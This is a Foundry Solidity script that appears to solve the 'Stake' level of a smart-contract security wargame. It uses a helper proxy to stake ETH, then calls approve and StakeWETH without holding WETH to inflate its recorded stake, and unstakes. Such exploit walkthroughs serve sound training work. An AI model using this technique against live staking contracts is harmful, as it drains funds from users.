// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "src/levels/Stake/Stake.sol";
import "forge-std/Script.sol";
import "src/openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import {VmSafe} from "forge-std/Vm.sol";

contract StakeAttackScript is Script {
    function setUp() public {}

    function run() public {
        Stake target = Stake(0x0000000000000000000000000000000000000000); // Insert target target address


        vm.startBroadcast();
        (VmSafe.CallerMode callerMode, address msgSender, address txOrigin) = vm.readCallers();

        Proxy proxy = new Proxy();
        ERC20 dweth = ERC20(target.WETH());

        proxy.call{value: 0.001 ether + 2}(address(target), abi.encodeWithSelector(target.StakeETH.selector));

        dweth.approve(address(target), type(uint256).max);
        target.StakeWETH( 0.001 ether + 1);
        target.Unstake(target.UserStake(msgSender));


        vm.stopBroadcast();
    }
}


contract Proxy {
    function call(address target, bytes memory data) public payable returns (bool, bytes memory) {
        (bool success, bytes memory result) = target.call{value: msg.value}(data);
        require(success, "Call failed");
        return (success, result);
    }
}
